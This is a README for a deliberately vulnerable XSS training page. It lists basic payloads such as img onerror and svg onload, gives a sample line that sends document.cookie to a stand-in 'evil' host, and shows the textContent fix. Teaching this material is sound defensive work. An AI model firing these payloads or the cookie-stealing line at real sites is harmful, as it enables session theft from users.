# 📜 xss-search — Cross-Site Scripting Demo

> A tiny vulnerable search page that echoes your query back using `innerHTML` — the classic XSS sink.

**Maps to:** [Day 1 → XSS](../../Day-1.md#-topic-3-cross-site-scripting-xss--medium)

---

## ▶️ How to Run

Double-click `index.html`, or open it in any browser. No install.

---

## 🎯 The Vulnerability

The page simulates a search feature where:

```html
<p>You searched for: USER_INPUT</p>
```

…is injected into the DOM with `innerHTML`. There's no escaping, no sanitization — whatever tags you type become real HTML.

---

## 🧪 Try These Attacks

Type each payload in the search box and click **Search**.

| # | Payload | Result |
|---|---------|--------|
| 1 | `<script>alert(1)</script>` | 🚫 **Blocked by browser** — see the note below |
| 2 | `<img src=x onerror=alert(1)>` | ✅ Classic XSS — the alert fires |
| 3 | `<svg onload=alert(1)>` | ✅ Alternate bypass |
| 4 | `<a href="javascript:alert(1)">click</a>` | ✅ Fires when you click the link |

### ⚠️ Why doesn't `<script>` work here?

Modern browsers refuse to execute `<script>` tags **inserted via `innerHTML`**. This is a genuine protection. In real bug hunting, you'll see the same behavior — and `<img onerror>` or `<svg onload>` is how you bypass it.

If `<script>` worked via `innerHTML`, half the internet would be exploited. It doesn't. That's by design. Use event handlers instead.

---

## 🧠 What to Observe

1. **Two live views** — the page shows you both what the "backend" built (as text) and what the browser actually rendered. The difference is the attack surface.
2. **Change contexts** — try payloads with `"` to see attribute-context XSS (e.g., `" onerror="alert(1)` if the input was in an attribute). This demo doesn't put your input inside an attribute, but keep the concept in mind.
3. **Open DevTools → Console** — if you alert from your payload, the `alert()` runs with the page's origin. Real attackers use this to steal cookies: `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`.

---

## 🛡️ How to Fix It

Never inject user input via `innerHTML`. Use `textContent` instead:

```js
// Vulnerable
result.innerHTML = '<p>You searched for: ' + input + '</p>';

// Safe
result.textContent = 'You searched for: ' + input;
```

`textContent` treats everything as plain text — `<script>` becomes the literal characters `<`, `s`, `c`, …, never a tag.

For HTML-templated content, use a templating library that escapes by default (React, Vue, Handlebars), or a sanitizer like [DOMPurify](https://github.com/cure53/DOMPurify).

---

## 🔗 Next

- Try [Google's XSS Game levels 1–3](https://xss-game.appspot.com)
- Try [PortSwigger's Reflected XSS lab](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
- Read the [XSS Cheat Sheet](../../CHEATSHEET.md#-cross-site-scripting-xss)

[← Back to demos index](../README.md)
